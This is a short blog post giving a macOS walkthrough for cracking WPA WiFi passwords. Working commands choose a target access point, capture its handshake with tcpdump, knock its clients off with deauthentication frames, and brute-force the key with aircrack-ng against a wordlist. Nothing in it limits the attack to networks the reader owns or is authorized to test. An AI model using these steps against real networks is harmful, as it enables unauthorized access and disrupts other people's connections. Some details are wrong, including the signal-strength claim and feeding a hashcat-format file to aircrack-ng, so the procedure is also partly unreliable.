---
layout: post
title: "Cracking WIiFi"
categories: tech
---

#Cracking wifi with MacOS

##Installing requirements
1. Install *Homebrew*
`ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"`
1. Install *cap2hccapx* from [JamWiFi](https://github.com/0x0XDev/JamWiFi)
`wget https://raw.githubusercontent.com/hashcat/hashcat-utils/master/src/cap2hccapx.c`
`gcc -o cap2hccapx cap2hccapx.c`
`sudo mv cap2hccapx /usr/local/bin/cap2hccapx`
`rm cap2hccapx.c`
1. Build with **make** the src folder of [hashcat-utils](https://github.com/hashcat/hashcat-utils) and copy cap2hccapx.bin to your working directory.
1. Install *aircrack-ng*
`brew install aircrack-ng`
1. Add *aircrack-ng* to path
1. Add *airport* to path
`sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport`

##Start cracking
1. Open JamWiFi. Press **Scan**.
1. Choose target. The less **RRSSI**, the better signal it has. (Ex. -54 is better than -74).
1. Copy the **BSSID** and **CHANNEL** of the selected target Access Point. (Change the data between <>, with these characters included, for the correct data.)
`export BSSID=<TARGET-BSSID>`
`export CHANNEL=<TARGET-CHANNEL>`
1. Disconnect from the wifi you are connected to, without disabling it. Use `sudo airport -z`
1. `sudo airport -c$CHANNEL`
1. Capture the bacon
`sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i en0 -w beacon.cap`
1. Capture handshake
`sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i en0 -w handshake.cap`
1. On JamWiFi choose the target and press **Deauth**, press **Monitor**, wait for some *Packets* to load and then **Do it!**. When you get ~50 *Deauths* press **Done.**
1. CTRL+C on the Terminal to terminate the capturing of handshake.
1. Merge the Beacon and Handshake
`mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap`
1. Convert cap to hccapx
`cap2hccapx capture.cap capture.hccapx`
If it says 'Written 0 WPA Handshakes to: capture.hccapx', try again to capture 
1. Starting brute force with wordlist. Change last data with path to your wordlist file.
`aircrack-ng -1 -a 1 -b $BSSID capture.hccapx -w <wordlist>`

##Source
1. [https://martinsjean256.wordpress.com/2018/02/12/hacking-aircrack-ng-on-mac-cracking-wi-fi-without-kali-in-parallels/](https://martinsjean256.wordpress.com/2018/02/12/hacking-aircrack-ng-on-mac-cracking-wi-fi-without-kali-in-parallels/)
1. [https://medium.com/@jansalvadorsebastian/hacking-wi-fi-penetration-on-macos-bc1f0f0f6296](https://medium.com/@jansalvadorsebastian/hacking-wi-fi-penetration-on-macos-bc1f0f0f6296)
1. [https://louisabraham.github.io/articles/WPA-wifi-cracking-MBP.html](https://louisabraham.github.io/articles/WPA-wifi-cracking-MBP.html)
1. [https://usedmyhead.blogspot.com/2017/06/como-hackear-contrasenas-wpa-wpa2-psk.html](https://usedmyhead.blogspot.com/2017/06/como-hackear-contrasenas-wpa-wpa2-psk.html)
